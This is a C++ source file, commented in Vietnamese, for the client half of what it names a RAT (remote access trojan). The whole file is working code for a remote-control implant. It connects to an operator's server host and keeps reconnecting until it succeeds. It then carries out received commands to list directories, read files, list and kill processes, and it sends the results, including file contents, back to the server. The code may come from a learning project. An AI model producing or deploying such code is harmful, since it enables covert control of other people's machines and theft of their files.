#include "client.h"
#include "executor.h"

#include <iostream>
#include <sstream>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <thread>
#include <chrono>

namespace RAT
{
    // Khởi tạo Client với host và port
    Client::Client(const std::string &host, int port)
        : server_host_(host), server_port_(port), sock_fd_(-1), is_running_(false) {}
    Client::~Client()
    {
        stop();
    }

    // Hàm kết nối tới server
    bool Client::connect_to_server()
    {
        while (is_running_)
        {
            // Tạo socket TCP IPv4
            sock_fd_ = ::socket(AF_INET, SOCK_STREAM, 0);
            if (sock_fd_ < 0)
            {
                std::cerr << Status::ERR << "Khong the tao socket!\n";
                return false;
            }

            // Thiết lập địa chỉ server
            struct sockaddr_in serv_addr{};
            serv_addr.sin_family = AF_INET;
            serv_addr.sin_port = htons(server_port_);

            // Chuyển đổi địa chỉ IP từ chuỗi sang dạng nhị phân
            if (::inet_pton(AF_INET, server_host_.c_str(), &serv_addr.sin_addr) <= 0)
            {
                std::cerr << Status::ERR << "Dia chi IP Server khong hop le: " << server_host_ << "\n";
                close_socket(sock_fd_);
                return false;
            }

            // Thử kết nối tới server
            if (::connect(sock_fd_, reinterpret_cast<struct sockaddr *>(&serv_addr), sizeof(serv_addr)) == 0)
            {
                std::cout << Status::OK << "Da ket noi thanh cong toi Server ["
                          << server_host_ << ":" << server_port_ << "]!\n";
                return true;
            }

            // Nếu kết nối thất bại, đóng socket và thử lại sau 3 giây
            close_socket(sock_fd_);
            std::cout << Status::INFO << "Chua ket noi duoc toi Server. Thu lai sau 3 giay...\n";
            std::this_thread::sleep_for(std::chrono::seconds(3));
        }
        return false;
    }

    // Phân tích và thực thi lệnh tương ứng
    std::string Client::execute_command(const std::string &raw_cmd)
    {
        std::istringstream iss(raw_cmd);

        // Tách từ đầu tiên làm tên lệnh
        std::string cmd_name;
        if (!(iss >> cmd_name))
        {
            return Status::ERR + "Lenh rong!";
        }

        // Tách phần còn lại làm tham số(nếu có)
        std::string cmd_args;
        std::getline(iss >> std::ws, cmd_args);

        // 1. Lệnh LIST_DIR <path>
        if (cmd_name == Command::LIST_DIR)
        {
            return Executor::list_directory(cmd_args);
        }
        // 2. Lệnh READ_FILE <filepath>
        else if (cmd_name == Command::READ_FILE)
        {
            return Executor::read_file_content(cmd_args);
        }
        // 3. Lệnh LIST_PROC
        else if (cmd_name == Command::LIST_PROC)
        {
            return Executor::list_processes();
        }
        // 4. Lệnh KILL_PROC <pid>
        else if (cmd_name == Command::KILL_PROC)
        {
            try
            {
                int pid = std::stoi(cmd_args);
                return Executor::kill_process(pid);
            }
            catch (const std::exception &)
            {
                return Status::ERR + "Tham so PID khong hop le: " + cmd_args;
            }
        }

        return Status::ERR + "Lenh khong hop le: " + cmd_name;
    }

    // Khởi động Client và kết nối tới Server
    void Client::start()
    {
        is_running_ = true;

        // Vòng lặp ngoài để kết nối
        while (is_running_)
        {
            if (!connect_to_server())
            {
                break;
            }

            // Vòng lặp bên trong nhận lệnh và thực thi
            while (is_running_)
            {
                std::string cmd;

                // Nhận lệnh từ Server
                if (!recv_message(sock_fd_, cmd))
                {
                    std::cerr << Status::ERR << "Mat ket noi voi Server! Dang thu ket noi lai...\n";
                    close_socket(sock_fd_);
                    break; // Thoát vòng lặp trong để vòng lặp ngoài kết nối lại
                }

                // Nếu nhận được lệnh EXIT từ Server -> dừng hẳn Client ngay lập tức
                if (cmd == Command::EXIT)
                {
                    std::cout << Status::INFO << "Nhan lenh EXIT tu Server. Dang thoat Client...\n";
                    is_running_ = false;
                    break;
                }

                // Thực thi lệnh thông thường
                std::string response = execute_command(cmd);

                // Gửi phản hồi về Server
                if (!send_message(sock_fd_, response))
                {
                    std::cerr << Status::ERR << "Loi khi gui phan hoi ve Server!\n";
                    close_socket(sock_fd_);
                    break;
                }
            }
        }
        stop();
    }

    // Ngắt kết nối và giải phóng tài nguyên
    void Client::stop()
    {
        is_running_ = false;
        close_socket(sock_fd_);
    }
}